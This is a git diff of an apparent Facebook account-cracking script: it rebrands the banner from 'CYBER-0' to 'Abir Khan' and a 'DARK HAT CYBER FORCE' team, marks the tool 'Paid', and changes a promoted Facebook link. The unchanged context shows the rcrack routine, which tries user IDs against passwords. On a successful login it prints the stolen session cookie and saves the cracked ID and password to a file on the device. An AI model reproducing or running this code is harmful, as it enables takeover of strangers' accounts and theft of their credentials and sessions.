@@ -94,16 +94,16 @@ today = date.today()
 logo = ("""
     
  \033[1;93m╔═════════════════[\033[1;32m 𝘼𝘿𝙈𝙄𝙉 𝙄𝙉-𝙁𝙍𝙊 \033[1;32m]══════════════╗
- \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m Abir Khan    \033[1;32m║
- \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m CYBER-0    \033[1;32m║
- \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35mCyber.0 Army       \033[1;32m ║
- \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m 𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒍𝒐𝒏𝒊𝒏𝒈       \033[1;32m ║
- \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;32     unknown  \033[1;32m ║
- \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m5.5                  \033[1;32m ║
+ \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m Abir Khan  \033[1;32m║
+ \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m                  Abir Khan  \033[1;32m║
+ \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35m                 CyberAbir0   \033[1;32m ║
+ \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Crack 🔰       \033[1;32m ║
+ \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;32     DARK HAT CYBER FORCE - DHCF❤️✅  \033[1;32m ║
+ \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m5.5         Paid         \033[1;32m ║
  \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;32m║
- \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....                 \033[1;32m  ║
- \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m Cyber.0....          \033[1;32m ║
- \033[1;93m╚═════════════════[\033[1;93m CYBER - 0 \033[1;32m]══════════════╝""")
+ \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m Welcome To My tools               \033[1;32m  ║
+ \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m CyberAbir0       \033[1;32m ║
+ \033[1;93m╚═════════════════[\033[1;93m Welcome \033[1;32m]══════════════╝""")
 def linex():
 	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
 loop = 0
@@ -111,7 +111,7 @@ oks = []
 cps = []
 def clear():
     os.system('clear')
-    #os.system('xdg-open https://facebook.com/groups/412641030225365/')
+    #os.system('xdg-open https://www.facebook.com/CyberAbir121/')
     print(logo)
 from time import localtime as lt
 from os import system as cmd
@@ -598,9 +598,9 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[CYBER-0] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[Abir❗] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/Cyber-0.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/Abir❗.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
